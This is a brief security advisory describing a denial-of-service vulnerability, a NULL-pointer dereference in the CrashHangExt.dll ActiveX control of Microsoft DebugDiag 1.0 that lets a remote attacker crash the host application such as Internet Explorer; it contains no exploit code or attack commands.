Microsoft DebugDiag 'CrashHangExt.dll' ActiveX control is prone to a denial-of-service vulnerability because of a NULL-pointer dereference error.

A successful attack allows a remote attacker to crash the application using the ActiveX control (typically Internet Explorer), denying further service to legitimate users.

Microsoft DebugDiag 1.0 is vulnerable; other versions may also be affected.
